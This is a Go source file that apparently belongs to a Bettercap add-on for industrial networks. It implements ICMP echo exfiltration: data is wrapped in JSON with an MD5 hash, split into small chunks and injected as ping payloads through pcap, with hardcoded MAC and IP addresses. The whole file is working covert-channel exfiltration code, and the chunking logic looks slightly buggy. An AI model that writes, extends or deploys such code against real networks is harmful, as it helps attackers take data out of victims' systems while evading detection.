package client_icmp_echo8

import (
	"crypto/md5"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"

	// session contain the sniffed interface parameter name

	"github.com/biero-el-corridor/Bettercap_ICS/session"
)

type exfil_data struct {
	MD5  [16]byte `json:"MD5"`
	DATA []byte   `json:"DATA"`
}

var (
	//device       string session.I.Interface.Hostname
	snapshot_len int32 = 1024
	promiscuous  bool  = true
	err          error
	timeout      time.Duration = 30 * time.Second
	handle       *pcap.Handle
)

func randomHex(n int) (string, error) {
	bytes := make([]byte, n)
	if _, err := rand.Read(bytes); err != nil {
		return "", err
	}
	return hex.EncodeToString(bytes), nil
}

func shape_exfil_data(data []byte) {

	var exfil = exfil_data{}
	//fmt.Println("data1 string = ", data)
	//fmt.Println("md51 string = ", md5.Sum(data))
	md5 := md5.Sum(data)
	exfil.DATA = data
	exfil.MD5 = md5

	//fmt.Println("data2 string = ", data)
	//fmt.Println("md52 string = ", md5)
	interm, err := json.Marshal(exfil)
	if err != nil {
		fmt.Println("")
	}
	// last encoding for not send in clear text
	// no cyphering for now onlly hex value encoding
	final, err := json.Marshal(interm)
	if err != nil {
		fmt.Println("")
	}

	// need to segment the packet into 32 bit chunk

	nb_packet := (len(final) / 32) + 1

	end_block := 0
	for nb_packet != 0 {
		if nb_packet == 1 {
			exil_icmp_echo(final[end_block:])
		} else {
			end_block += 31
			exil_icmp_echo(final[(end_block - 31):end_block])
		}
		nb_packet = nb_packet - 1
	}

}

func exil_icmp_echo(exfil_array []byte) {

	//session.I.Interface.Hostname
	device := session.I.Interface.Hostname
	// Open device
	handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	// add a functions to modify mac address
	ethernetLayer := &layers.Ethernet{ // https://pkg.go.dev/github.com/google/gopacket@v1.1.19/layers#Ethernet.EthernetType
		SrcMAC:       net.HardwareAddr{0x4C, 0xE7, 0x05, 0x10, 0x22, 0xA3},
		DstMAC:       net.HardwareAddr{0x4C, 0xE7, 0x05, 0x10, 0x22, 0xA3},
		EthernetType: 0x0800,
	}

	ipLayer := &layers.IPv4{ // https://pkg.go.dev/github.com/google/gopacket@v1.1.19/layers#IPv4
		Version:  4,
		IHL:      uint8(5),
		TOS:      0,
		Length:   40,
		Id:       28829,
		Flags:    2,
		Protocol: layers.IPProtocolICMPv4,
		TTL:      64,
		Checksum: 0,
		SrcIP:    net.IP{169, 254, 0, 6},
		DstIP:    net.IP{169, 254, 0, 5},
	}

	// add a element to mofify the ID sections
	//note the icmp packet is not the same on windows and linux
	// the linux ICMP have a timestamp the windows does not
	icmpLayer := &layers.ICMPv4{
		TypeCode: layers.CreateICMPv4TypeCode(uint8(8), uint8(0)),
		Seq:      1, // avoir un roulement au niveaux de l'indicateur.
		Id:       3177,
	}

	////////////////////////
	///// TCP Sections
	///////////////////////
	//buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	////////////////////////
	///// ICMP Sections
	///////////////////////
	// And create the packet with the layers
	buffer := gopacket.NewSerializeBuffer()
	gopacket.SerializeLayers(buffer,
		options,
		ethernetLayer,
		ipLayer,
		icmpLayer,
		gopacket.Payload(exfil_array),
	)
	///////////////////
	/// packet sending
	///////////////////
	//fmt.Println("data string value : ", exfil_array)

	err = handle.WritePacketData(buffer.Bytes())
	if err != nil {
		log.Fatal(err)
	}
}
